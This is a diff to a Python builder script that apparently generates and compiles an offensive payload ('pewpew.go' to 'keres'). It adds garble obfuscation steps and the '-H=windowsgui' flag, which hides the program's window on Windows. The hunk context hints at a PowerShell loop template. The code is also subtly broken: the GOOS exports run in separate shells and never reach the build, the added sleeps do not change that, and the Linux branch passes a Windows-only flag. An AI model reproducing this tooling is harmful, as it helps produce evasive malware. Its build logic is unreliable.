@@ -8,7 +8,7 @@ import sys
 import platform
 import base64
 import re
-
+import time
 def display_ansi_art(file_path):
     with open(file_path, 'r', encoding='latin-1') as file:
         ansi_art = file.read()
@@ -218,17 +218,19 @@ while ($true){{
         if platform.system().lower() != "windows":
             if args.platform=="Windows":
                 subprocess.run("export GOOS=windows GOARCH=amd64", shell=True)
+                time.sleep(1)
                 subprocess.run("garble -literals -tiny build -ldflags '-H=windowsgui' -o ./Output/keres.exe pewpew.go", shell=True)
                 print("Finished creating the executable in Output folder.")
             if args.platform=="Linux":
 
                 subprocess.run("export GOOS=linux ", shell=True)
+                time.sleep(1)
                 subprocess.run("garble -literals -tiny build -ldflags '-H=windowsgui' -o  ./Output/keres pewpew.go", shell=True)
                 print("Finished creating the executable in Output folder.")
         
         else:
             if args.platform=="Windows":
-                subprocess.run("garble  -literals -tiny build -o ./Output/keres.exe pewpew.go ")
+                subprocess.run("""garble  -literals -tiny build -ldflags "-H=windowsgui" -o ./Output/keres.exe pewpew.go """)
                 print("Finished creating the executable in Output folder.")
             
         return
